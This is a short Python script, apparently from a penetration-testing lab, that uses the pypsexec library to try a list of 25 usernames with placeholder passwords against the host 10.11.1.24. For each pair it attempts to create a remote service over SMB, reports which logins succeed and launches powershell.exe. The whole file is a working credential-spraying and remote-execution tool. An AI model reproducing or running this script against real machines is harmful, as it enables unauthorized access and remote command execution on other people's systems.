#import psexec 

from pypsexec.client import Client

logins = [('alice','ThisIsTheUsersPassword01'),('pedro','ThisIsTheUsersPassword02'),('mike','ThisIsTheUsersPassword03'),('bob','ThisIsTheUsersPassword04'),('ralph','ThisIsTheUsersPassword05'),('bethany','ThisIsTheUsersPassword06'),('bruce','ThisIsTheUsersPassword07'),('sherlock','ThisIsTheUsersPassword08'),('nicky','ThisIsTheUsersPassword09'),('jeff','ThisIsTheUsersPassword10'),('joe','ThisIsTheUsersPassword11'),('kevin','ThisIsTheUsersPassword12'),('cory','ThisIsTheUsersPassword13'),('nina','ThisIsTheUsersPassword14'),('brett','ThisIsTheUsersPassword15'),('carol','ThisIsTheUsersPassword16'),('james','ThisIsTheUsersPassword17'),('john','ThisIsTheUsersPassword18'),('pete','ThisIsTheUsersPassword19'),('adam','ThisIsTheUsersPassword20'),('evan','ThisIsTheUsersPassword21'),('tris','ThisIsTheUsersPassword22'),('sqlServer','ThisIsTheUsersPassword23'),('HP3service','ThisIsTheUsersPassword24'),('extmailservice','ThisIsTheUsersPassword25')]


server = "10.11.1.24"
executable = "powershell.exe"
arguments = ""

for uname,pw in logins:
    # psobject=psexec.PSEXEC("cmd.exe","c:\\windows\\system32\\","445/SMB",username=uname, password=pw)
    # psobject.run("10.11.1.21")+
    
    try:
        c = Client(server, username=uname, password=pw,
           encrypt=True)
        c.connect()
        c.create_service()
        print("Success with username {0} and password {1}".format(uname,pw))
        result = c.run_executable(executable, arguments=arguments)
        
    except Exception as e:
        print(e)
    # finally:
    #     c.remove_service()
    #     c.disconnect()